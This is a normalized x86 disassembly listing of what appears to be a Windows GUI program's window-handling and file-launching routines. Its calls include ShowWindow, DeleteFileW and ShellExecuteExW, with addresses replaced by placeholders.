mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] cl
mov eax [ eax ]
cmp eax ecx
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_412320
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
sub_40c9f0
push esi
mov esi ecx
mov eax [ esi + 0x1b0 ]
push 0x0
push eax
mov [ esi + 0x2f0 ] 0x1
call [ ShowWindow@IAT ]
mov eax [ esi + 0x2d0 ]
mov [ esi + 0x2ec ] 0x1
test eax eax
je r-xdata
cmp [ esi + 0x2d8 ] 0x0
pop esi
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x10 ]
push eax
call edx
mov eax [ esi + 0x2d0 ]
test eax eax
je r-xdata
xor eax eax
retn 0x4
mov eax [ rw-data ]
mov ecx [ eax + 0x20 ]
push ecx
call [ DeleteFileW@IAT ]
mov [ esi + 0x2d0 ] 0x0
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
sub_40ca60
push ebp
mov ebp esp
push 0xffffffff
push sub_44b476
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov ebx 0x1
cmp [ ebp + 0x8 ] ebx
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ esi + 0x70 ]
mov edx [ eax + 0x5c ]
lea ecx [ esi + 0x70 ]
push 0x3eb
call edx
mov [ esi + 0x2d4 ] eax
mov [ eax + 0x78 ] 0x0
mov [ eax + 0x7c ] 0x64
mov eax [ esi + 0x2d4 ]
mov [ eax + 0x80 ] ebx
mov eax [ esi ]
mov edx [ eax + 0x38 ]
push ebx
mov ecx esi
call edx
push 0x0
push ecx
mov eax esp
mov [ ebp - 0x10 ] esp
push eax
mov ecx r--data
call sub_402a00
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
call sub_40bf60
add esp 0x8
lea ebx [ esi + 0x2d0 ]
push ebx
push r--data
push r--data
push r--data
call [ Ordinal_crt_133@IAT ]
mov eax [ ebx ]
test eax eax
jne r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0xc ]
push 0x1
push 0x0
push eax
call edx
mov eax [ ebx ]
mov [ ebp + 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x2
test eax eax
je r-xdata
push esi
mov ebx r--data
call sub_40d860
mov [ esi + 0x2e4 ] 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebp - 0x4 ] 0x3
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov ecx [ eax ]
lea edx [ ebp + 0x8 ]
push edx
push r--data
push eax
mov eax [ ecx ]
call eax
mov eax [ rw-data ]
mov ecx [ eax + 0x20 ]
mov ebx [ ebx ]
mov eax [ eax + 0xc ]
mov edx [ ebx ]
push 0x0
push esi
push sub_40cbe0
push 0x1
push ecx
push eax
mov eax [ edx + 0x28 ]
push ebx
call eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0xc ]
push 0x0
push eax
call edx
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
sub_40cbe0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0x14 ]
test eax eax
jne r-xdata
cmp eax 0x3
jne r-xdata
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
mov edx [ esi + 0x1b0 ]
push eax
push ecx
push 0x7e8
push edx
jmp r-xdata
xor eax eax
cmp [ esi + 0x2ec ] al
pop esi
sete al
pop ebp
retn 0x10
mov ecx [ esi + 0x1b0 ]
xor eax eax
cmp [ ebp + 0xc ] eax
push 0x0
setne al
push eax
push 0x7e9
push ecx
call [ PostMessageW@IAT ]
sub_40cc40
push ebp
mov ebp esp
mov eax [ ecx + 0x2d4 ]
mov [ ecx + 0x2dc ] 0x1
test eax eax
je r-xdata
pop ebp
retn 0x4
test edx edx
jle r-xdata
mov eax [ ebp + 0x8 ]
push esi
mov esi [ ecx + 0x2d4 ]
mov edx [ esi ]
mov [ esi + 0x74 ] eax
mov eax [ edx + 0x78 ]
mov ecx esi
call eax
test al al
je r-xdata
mov [ eax + 0x78 ] 0x0
mov [ eax + 0x7c ] edx
pop esi
cmp [ esi + 0x24 ] 0x0
je r-xdata
cmp [ esi + 0x25 ] 0x0
je r-xdata
cmp [ esi + 0x26 ] 0x0
je r-xdata
mov ecx [ esi + 0x1c ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
cmp [ eax + 0xab ] 0x0
mov edx [ ecx ]
mov edx [ edx + 0x20 ]
sete al
movzx eax al
push 0x0
push eax
push esi
call edx
sub_40ccc0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_44b406
mov eax [ fs : 0x0 ]
push eax
sub esp 0x218
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x210 ] eax
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x220 ]
mov [ fs : 0x0 ] eax
cmp [ ebp + 0x8 ] 0x0
mov [ edi + 0x2dc ] 0x0
je r-xdata
push 0x0
push ecx
mov edx esp
mov [ esp + 0x10 ] esp
mov esi 0x1
push edx
mov ecx r--data
mov [ edi + 0x2d8 ] esi
call sub_402a00
mov [ esp + 0x230 ] esi
mov [ esp + 0x230 ] 0xffffffff
call sub_40bf60
add esp 0x8
push 0x0
push 0x0
push 0x465
mov eax [ edi + 0x2d4 ]
test eax eax
je r-xdata
push 0x0
push ecx
mov eax esp
mov [ esp + 0x10 ] esp
push eax
mov ecx r--data
call sub_402a00
mov [ esp + 0x230 ] 0x0
mov [ esp + 0x230 ] 0xffffffff
call sub_40bf60
mov esi [ rw-data ]
mov ecx [ esi + 0x14 ]
add esp 0x8
cmp [ ecx - 0xc ] 0x0
je r-xdata
mov [ eax + 0x78 ] 0x0
mov [ eax + 0x7c ] 0x989680
mov esi [ edi + 0x2d4 ]
mov eax [ esi ]
mov edx [ eax + 0x78 ]
mov ecx esi
mov [ esi + 0x74 ] 0x98967f
call edx
test al al
je r-xdata
push 0x0
push 0x0
push 0x464
jmp r-xdata
xor edx edx
push 0x206
push edx
lea eax [ esp + 0x16 ]
push eax
mov [ esp + 0x18 ] dx
call memset
mov edx [ esi + 0x20 ]
add esp 0xc
push 0x104
lea ecx [ esp + 0x10 ]
push ecx
push edx
call [ Ordinal_crt_82@IAT ]
mov eax [ esi + 0x14 ]
add esp 0xc
lea ecx [ esp + 0xc ]
push ecx
push eax
call [ _wcsicmp@IAT ]
add esp 0x8
neg eax
sbb eax eax
inc eax
jne r-xdata
cmp [ esi + 0x24 ] 0x0
je r-xdata
mov eax [ edi + 0x1b0 ]
push eax
mov edx [ esi + 0x20 ]
push edx
call [ DeleteFileW@IAT ]
mov ecx [ edi + 0x1b0 ]
push 0x0
push 0x1
push 0x465
push ecx
jmp r-xdata
cmp [ esi + 0x25 ] 0x0
je r-xdata
call [ PostMessageW@IAT ]
mov ecx [ esp + 0x220 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov ecx [ esp + 0x210 ]
xor ecx esp
call sub_443fba
mov esp ebp
pop ebp
retn 0x4
cmp [ esi + 0x26 ] 0x0
je r-xdata
mov ecx [ esi + 0x1c ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
cmp [ eax + 0xab ] 0x0
mov edx [ ecx ]
mov edx [ edx + 0x20 ]
sete al
movzx eax al
push 0x0
push eax
push esi
call edx
sub_40ceb0
push esi
push edi
call [ GetForegroundWindow@IAT ]
mov edi eax
call [ GetCurrentThreadId@IAT ]
push 0x0
push edi
mov esi eax
call [ GetWindowThreadProcessId@IAT ]
push 0x1
mov edi eax
push esi
push edi
call [ AttachThreadInput@IAT ]
push ebx
call [ SetForegroundWindow@IAT ]
push 0x0
push esi
push edi
call [ AttachThreadInput@IAT ]
push ebx
call [ IsIconic@IAT ]
pop edi
pop esi
test eax eax
je r-xdata
retn
push 0x9
push ebx
call [ ShowWindow@IAT ]
sub_40cf00
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push ebx
push esi
push edi
mov edi ecx
mov ecx 0x1
mov esi ecx
cmp eax 0x7e8
ja r-xdata
cmp eax 0x7e9
je r-xdata
je r-xdata
mov [ edi + 0x21c ] ecx
mov ecx [ ebp + 0x10 ]
push ecx
call sub_40ccc0
mov ecx [ ebp + 0x14 ]
mov edx [ ebp + 0x10 ]
push ecx
push edx
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
call sub_412580
pop edi
mov esi eax
pop esi
pop ebx
pop ebp
retn 0x10
mov eax [ ebp + 0x10 ]
mov edx [ ebp + 0x14 ]
mov [ edi + 0x21c ] ecx
push eax
mov ecx edi
call sub_40cc40
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
lea edx [ eax - 0x464 ]
cmp edx 0x4
ja r-xdata
jmp [ edx * 4 + jump_table_40d060 ]
mov [ edi + 0x21c ] ecx
mov ecx edi
call sub_40d080
cmp [ edi + 0x2e8 ] 0x0
je r-xdata
mov eax [ ebp + 0x10 ]
push eax
push ecx
mov ebx edi
mov [ edi + 0x21c ] ecx
mov [ edi + 0x2e4 ] ecx
call sub_40d710
cmp [ edi + 0x2e8 ] 0x0
je r-xdata
cmp [ edi + 0x2e4 ] 0x0
mov [ edi + 0x21c ] ecx
mov [ edi + 0x2e8 ] ecx
jne r-xdata
xor edx edx
cmp [ edi + 0x2f0 ] edx
mov [ edi + 0x21c ] ecx
setne dl
pop edi
mov esi edx
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
mov ebx [ edi + 0x1b0 ]
mov [ edi + 0x21c ] ecx
call sub_40ceb0
push r--data
call [ OutputDebugStringW@IAT ]
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
mov eax edi
call sub_412870
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
mov eax edi
call sub_412870
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
mov ecx [ edi + 0x1b0 ]
push 0x0
push ecx
call [ ShowWindow@IAT ]
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
sub_40d080
push ebp
mov ebp esp
push 0xffffffff
push sub_44b3c1
mov eax [ fs : 0x0 ]
push eax
sub esp 0x254
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx [ rw-data ]
mov esi ecx
mov [ ebp - 0x21c ] esi
call [ Ordinal_crt_7@IAT ]
test al al
jne r-xdata
mov ecx [ ebx + 0x10 ]
mov edi [ ebx + 0x18 ]
mov esi [ ebx + 0x20 ]
push ecx
call sub_403840
mov edi [ ebp - 0x21c ]
mov esi [ edi + 0x2d4 ]
add esp 0x4
test esi esi
je r-xdata
call [ Ordinal_crt_90@IAT ]
test eax eax
je r-xdata
mov edx [ ebx + 0x20 ]
push edx
mov [ rw-data ] 0x1
call [ DeleteFileW@IAT ]
mov ecx edi
call sub_40d370
call sub_413cc0
call [ Ordinal_crt_91@IAT ]
test al al
jne r-xdata
xor eax eax
push 0x206
push eax
lea ecx [ ebp - 0x216 ]
push ecx
mov [ ebp - 0x218 ] ax
call memset
mov edx [ rw-data ]
mov eax [ edx + 0xc ]
add esp 0xc
mov ecx rw-data
call eax
add eax 0x10
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x4 ] 0x1
mov edx [ rw-data ]
push 0x104
lea ecx [ ebp - 0x218 ]
push ecx
push edx
call [ GetModuleFileNameW@IAT ]
mov eax [ ebx + 0x18 ]
cmp [ eax - 0xc ] 0x0
mov ecx [ ebx + 0x10 ]
mov edx [ ebx + 0x20 ]
lea edi [ ebp - 0x220 ]
jne r-xdata
push eax
push ecx
push edx
push r--data
call sub_401dc0
add esp 0x10
push ecx
push edx
push r--data
call sub_401dc0
add esp 0xc
jmp r-xdata
call [ GetLastError@IAT ]
cmp eax 0x4c7
jne r-xdata
mov ecx [ ebp - 0x224 ]
push 0xffffffff
push ecx
call [ WaitForSingleObject@IAT ]
mov eax [ esi + 0x2d4 ]
test eax eax
je r-xdata
push 0x38
lea eax [ ebp - 0x258 ]
push 0x0
push eax
call memset
mov edx [ ebp - 0x220 ]
add esp 0xc
lea eax [ ebp - 0x25c ]
lea ecx [ ebp - 0x218 ]
push eax
mov [ ebp - 0x258 ] 0x40
mov [ ebp - 0x25c ] 0x3c
mov [ ebp - 0x240 ] 0x5
mov [ ebp - 0x24c ] ecx
mov [ ebp - 0x248 ] edx
mov [ ebp - 0x250 ] r--data
call [ ShellExecuteExW@IAT ]
test eax eax
je r-xdata
mov eax [ esi + 0x2d4 ]
test eax eax
je r-xdata
push 0x0
mov edi 0x1
push 0x0
mov ebx esi
mov [ esi + 0x2e0 ] edi
call sub_40d710
mov eax ebx
mov [ eax + 0x2e4 ] edi
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x220 ]
call sub_402ca0
jmp r-xdata
mov edx [ ebp - 0x224 ]
push edx
call [ CloseHandle@IAT ]
mov ebx [ ebx + 0x20 ]
push ebx
call [ DeleteFileW@IAT ]
mov ecx esi
mov [ rw-data ] 0x1
call sub_40d370
jmp r-xdata
mov esi eax
call sub_413cc0
mov esi [ ebp - 0x21c ]
mov ebx [ ebx + 0x20 ]
push ebx
call [ DeleteFileW@IAT ]
push esi
mov ebx r--data
call sub_40d860
mov esi [ ebp - 0x21c ]
mov ecx [ esi + 0x1b0 ]
push ecx
call [ IsIconic@IAT ]
test eax eax
je r-xdata
mov esi eax
call sub_413cc0
mov esi [ ebp - 0x21c ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_443fba
mov esp ebp
pop ebp
retn
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x220 ]
add eax 0xfffffff0
lea edx [ eax + 0xc ]
or ecx 0xffffffff
[ edx ] ecx
dec ecx
test ecx ecx
jg r-xdata
mov eax [ esi + 0x1b0 ]
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push eax
call [ SetWindowPos@IAT ]
mov ecx [ esi + 0x1b0 ]
push ecx
call [ SetForegroundWindow@IAT ]
mov edx [ esi + 0x1b0 ]
push 0x9
push edx
call [ ShowWindow@IAT ]
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
jmp r-xdata
sub_40d370
push ebp
mov ebp esp
push 0xffffffff
push sub_44b378
mov eax [ fs : 0x0 ]
push eax
sub esp 0x18
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
push 0x0
push ecx
mov eax esp
mov [ ebp - 0x10 ] esp
push eax
mov ecx r--data
mov [ esi + 0x2e4 ] 0x1
call sub_402a00
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
call sub_40bf60
add esp 0x8
push esi
mov ebx r--data
call sub_40d860
mov esi [ esi + 0x1b0 ]
call [ GetFocus@IAT ]
cmp eax esi
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] eax
push ecx
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x24 ] 0x14
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x1c ] 0x2
mov [ ebp - 0x18 ] 0xa
call [ FlashWindowEx@IAT ]
sub_40d430
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_44b6a6
mov eax [ fs : 0x0 ]
push eax
sub esp 0x228
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x220 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x238 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0xc ]
sub eax 0x3ef
mov esi ecx
je r-xdata
mov eax [ rw-data ]
mov edi [ eax + 0x8 ]
mov ebx [ PostMessageW@IAT ]
test edi edi
je r-xdata
mov ebx 0x1
sub eax ebx
je r-xdata
mov edx [ esi + 0x140 ]
push 0x0
push 0xf060
push 0x112
push edx
call ebx
xor ecx ecx
push 0x20e
push ecx
lea edx [ esp + 0x26 ]
push edx
mov [ esp + 0x28 ] cx
call memset
add esp 0xc
xor eax eax
mov [ esp + 0x14 ] eax
mov [ esp + 0x18 ] eax
lea eax [ esp + 0x18 ]
push eax
lea ecx [ esp + 0x18 ]
push ecx
push 0x104
lea edx [ esp + 0x28 ]
push edx
push r--data
push edi
call [ lstrlenW@IAT ]
push eax
push edi
call [ _snwscanf_s@IAT ]
add esp 0x1c
cmp eax 0x3
jne r-xdata
or edi 0xffffffff
cmp [ esi + 0x270 ] 0x0
je r-xdata
sub eax ebx
jne r-xdata
mov eax [ esp + 0x18 ]
push 0x1
push eax
push r--data
call [ RegisterWindowMessageW@IAT ]
mov ecx [ esp + 0x1c ]
push eax
push ecx
call ebx
cmp [ esi + 0x26c ] 0x0
je r-xdata
push ebx
push ecx
mov edx esp
mov [ esp + 0x1c ] esp
push edx
mov ecx r--data
call sub_402a00
mov [ esp + 0x248 ] 0x0
mov [ esp + 0x248 ] edi
call sub_40bf60
add esp 0x8
mov ecx [ esp + 0x238 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x220 ]
xor ecx esp
call sub_443fba
mov esp ebp
pop ebp
retn 0x14
mov [ esi + 0x26c ] ebx
cmp [ esi + 0x270 ] eax
je r-xdata
mov edx [ esi + 0x140 ]
push 0x0
push 0xf060
push 0x112
push edx
call [ PostMessageW@IAT ]
jmp r-xdata
push 0x0
push ecx
mov eax esp
mov [ esp + 0x1c ] esp
push eax
mov ecx r--data
call sub_402a00
mov [ esp + 0x248 ] ebx
mov [ esp + 0x248 ] edi
call sub_40bf60
mov ecx [ esi + 0x140 ]
add esp 0x8
push ebx
push r--data
push r--data
push ecx
call [ MessageBoxW@IAT ]
cmp eax 0x2
je r-xdata
add esi 0xffffff90
push esi
call sub_40d650
mov ecx [ esi + 0x2d0 ]
mov eax [ rw-data ]
mov edx [ ecx ]
push 0x0
push esi
mov esi [ eax + 0x20 ]
mov eax [ eax + 0xc ]
push sub_40cbe0
push ebx
push esi
push eax
push ecx
mov ecx [ edx + 0x28 ]
call ecx
jmp r-xdata
lea ecx [ esi - 0x70 ]
call sub_40d080
jmp r-xdata
sub_40d650
push ebp
mov ebp esp
sub esp 0x1c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x70 ]
mov edx [ eax + 0x68 ]
add esi 0x70
push edi
mov ecx esi
call edx
mov [ ebp - 0x10 ] 0x3f0
mov [ ebp - 0xc ] 0x3ea
mov [ ebp - 0x8 ] 0x3eb
mov [ ebp - 0x1c ] 0x3ef
mov [ ebp - 0x18 ] 0x3f1
mov [ ebp - 0x14 ] 0x3e9
xor edi edi
mov edi edi
inc edi
cmp edi 0x3
jb r-xdata
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x24 ]
push 0x1
call eax
mov ecx [ ebp + edi * 4 - 0x10 ]
mov eax [ esi ]
mov edx [ eax + 0x5c ]
push ecx
mov ecx esi
call edx
test eax eax
je r-xdata
xor edi edi
inc edi
cmp edi 0x3
jb r-xdata
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x24 ]
push 0x0
call eax
mov edx [ esi ]
mov eax [ ebp + edi * 4 - 0x1c ]
mov edx [ edx + 0x5c ]
push eax
mov ecx esi
call edx
test eax eax
je r-xdata
mov edx [ esi ]
mov eax [ edx + 0x6c ]
mov ecx esi
call eax
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_443fba
mov esp ebp
pop ebp
retn 0x4
sub_40d710
push ebp
mov ebp esp
sub esp 0x1c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x70 ]
mov edx [ eax + 0x68 ]
push esi
push edi
xor edi edi
lea ecx [ ebx + 0x70 ]
mov [ ebx + 0x2dc ] edi
call edx
mov [ ebp - 0x10 ] 0x3f1
mov [ ebp - 0xc ] 0x3f0
mov [ ebp - 0x8 ] 0x3e9
mov [ ebp - 0x1c ] 0x3ef
mov [ ebp - 0x18 ] 0x3ea
mov [ ebp - 0x14 ] 0x3eb
nop
inc edi
cmp edi 0x3
jb r-xdata
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x24 ]
push 0x1
call eax
mov ecx [ ebp + edi * 4 - 0x10 ]
mov eax [ ebx + 0x70 ]
mov edx [ eax + 0x5c ]
push ecx
lea ecx [ ebx + 0x70 ]
call edx
test eax eax
je r-xdata
xor edi edi
jmp r-xdata
mov edx [ ebx + 0x70 ]
mov eax [ ebp + edi * 4 - 0x1c ]
mov edx [ edx + 0x5c ]
push eax
lea ecx [ ebx + 0x70 ]
call edx
test eax eax
je r-xdata
inc edi
cmp edi 0x3
jb r-xdata
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x24 ]
push 0x0
call eax
mov edx [ ebx + 0x70 ]
mov eax [ edx + 0x5c ]
push 0x3e9
lea ecx [ ebx + 0x70 ]
call eax
mov ecx eax
test ecx ecx
je r-xdata
mov edx [ ebx + 0x70 ]
mov eax [ edx + 0x6c ]
lea ecx [ ebx + 0x70 ]
call eax
mov ecx [ ebx + 0x1b0 ]
push ecx
call [ IsIconic@IAT ]
pop edi
pop esi
test eax eax
je r-xdata
cmp [ ebp + 0x8 ] 0x0
mov edx [ ecx ]
mov eax [ edx + 0x7c ]
je r-xdata
mov eax [ ebx + 0x1b0 ]
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push eax
call [ SetWindowPos@IAT ]
mov ecx [ ebx + 0x1b0 ]
push ecx
call [ SetForegroundWindow@IAT ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_443fba
mov esp ebp
pop ebp
retn 0x8
mov edx [ ebx + 0x1b0 ]
push 0x9
push edx
call [ ShowWindow@IAT ]
push r--data
cmp [ ebp + 0xc ] 0x1
jne r-xdata
push r--data
jmp r-xdata
push r--data
jmp r-xdata
call eax
sub_40d860
push ebp
mov ebp esp
sub esp 0x1c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push esi
push edi
lea esi [ eax + 0x70 ]
xor edi edi
mov [ eax + 0x2dc ] edi
mov eax [ esi ]
mov edx [ eax + 0x68 ]
mov ecx esi
call edx
mov [ ebp - 0x1c ] 0x3ef
mov [ ebp - 0x18 ] 0x3e9
mov [ ebp - 0x14 ] 0x3f1
mov [ ebp - 0x10 ] 0x3f0
mov [ ebp - 0xc ] 0x3ea
mov [ ebp - 0x8 ] 0x3eb
inc edi
cmp edi 0x2
jb r-xdata
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x24 ]
push 0x1
call eax
mov ecx [ ebp + edi * 4 - 0x1c ]
mov eax [ esi ]
mov edx [ eax + 0x5c ]
push ecx
mov ecx esi
call edx
test eax eax
je r-xdata
xor edi edi
jmp r-xdata
mov edx [ esi ]
mov eax [ ebp + edi * 4 - 0x14 ]
mov edx [ edx + 0x5c ]
push eax
mov ecx esi
call edx
test eax eax
je r-xdata
inc edi
cmp edi 0x4
jb r-xdata
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x24 ]
push 0x0
call eax
mov edx [ esi ]
mov eax [ edx + 0x5c ]
push 0x3e9
mov ecx esi
call eax
test eax eax
je r-xdata
mov edx [ esi ]
mov eax [ edx + 0x6c ]
mov ecx esi
call eax
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_443fba
mov esp ebp
pop ebp
retn 0x4
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x7c ]
push ebx
call eax
sub_40d940
push ebp
mov ebp esp
push 0xffffffff
push sub_44b348
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
cmp [ esi + 0x2dc ] 0x0
je r-xdata
mov edx [ esi + 0x1b0 ]
push 0x0
push 0xf060
push 0x112
push edx
call [ PostMessageW@IAT ]
push 0x0
push ecx
mov eax esp
mov [ ebp - 0x10 ] esp
push eax
mov ecx r--data
call sub_402a00
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
call sub_40bf60
mov ecx [ esi + 0x1b0 ]
add esp 0x8
push 0x1
push r--data
push r--data
push ecx
call [ MessageBoxW@IAT ]
cmp eax 0x2
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
sub_40da20
push ebp
mov ebp esp
and esp 0xfffffff8
push ecx
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
push esi
mov esi [ ebp + 0xc ]
je r-xdata
xor eax eax
pop esi
mov esp ebp
pop ebp
retn 0x8
cmp edx 0x116
jne r-xdata
cmp edx 0x117
jne r-xdata
push esi
push eax
call sub_41d1f0
mov [ edi ] eax
cmp edx 0x11f
jne r-xdata
shr ecx 0x10
mov [ esp + 0x4 ] 0x1
test ecx ecx
je r-xdata
cmp edx 0x2b
jne r-xdata
shr esi 0x10
mov [ esp + 0x4 ] 0x1
cmp esi 0xffff
jne r-xdata
push eax
lea edx [ esp + 0x8 ]
mov ecx esi
call sub_41d2a0
mov ecx [ esp + 0x4 ]
xor ecx ecx
lea eax [ ecx + 0x1 ]
jmp r-xdata
cmp edx 0x2c
jne r-xdata
mov esi 0x1
cmp [ ecx ] esi
jne r-xdata
xor ecx ecx
mov eax 0x1
lea edx [ esp + 0x4 ]
push edx
push ecx
mov ecx eax
call sub_41d760
mov ecx [ esp + 0x4 ]
jmp r-xdata
mov eax 0x1
pop esi
mov esp ebp
pop ebp
retn 0x8
mov [ edi ] eax
test ecx ecx
je r-xdata
mov esi 0x1
cmp [ ecx ] esi
jne r-xdata
xor esi esi
cmp [ ecx + 0x2c ] 0x0
je r-xdata
mov eax 0x1
pop esi
mov esp ebp
pop ebp
retn 0x8
mov [ edi ] eax
test ecx ecx
je r-xdata
xor esi esi
cmp [ ecx + 0x14 ] 0x0
je r-xdata
mov eax 0x1
pop esi
mov esp ebp
pop ebp
retn 0x8
push eax
call sub_41c7d0
jmp r-xdata
mov eax 0x1
pop esi
mov esp ebp
pop ebp
retn 0x8
push ecx
push eax
call sub_41bce0
jmp r-xdata
mov [ edi ] 0x1
test esi esi
je r-xdata
mov [ edi ] 0x0
test esi esi
jne r-xdata
sub_40db50
push ebp
mov ebp esp
push 0xffffffff
push sub_44b66f
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx ecx
cmp [ ebp + 0x1c ] 0x0
mov edi 0x1
mov [ ebp - 0x10 ] edi
jne r-xdata
mov esi [ ebp + 0x8 ]
mov eax [ ebp + 0x10 ]
cmp eax edi
jne r-xdata
mov eax [ ebp + 0x14 ]
mov ecx [ ebp + 0x10 ]
mov edx [ esi ]
mov edx [ edx + 0x9c ]
push eax
mov eax [ ebp + 0xc ]
push ebx
push ecx
push eax
mov ecx esi
mov [ esi + 0x21c ] 0x0
call edx
mov ecx [ ebp + 0x18 ]
mov [ ecx ] eax
xor eax eax
cmp [ esi + 0x21c ] eax
setne al
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
mov eax [ ebp + 0x10 ]
lea edx [ ebp - 0x10 ]
lea ecx [ esi + 0x1ac ]
mov esi [ ebp + 0x14 ]
push edx
call sub_430330
cmp [ ebp - 0x10 ] 0x0
mov ecx [ ebp + 0x18 ]
mov [ ecx ] eax
jne r-xdata
cmp eax 0x2
jne r-xdata
mov esi [ ebp + 0x8 ]
mov [ esi + 0x21c ] edi
mov edi esi
call sub_418da0
mov ecx [ ebp + 0x18 ]
mov [ ecx ] eax
cmp [ esi + 0x21c ] 0x0
je r-xdata
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
mov esi [ ebp + 0x8 ]
cmp eax 0x14
jne r-xdata
mov esi [ ebp + 0x8 ]
mov eax esi
mov [ esi + 0x21c ] edi
call sub_418ed0
mov edi [ ebp + 0x18 ]
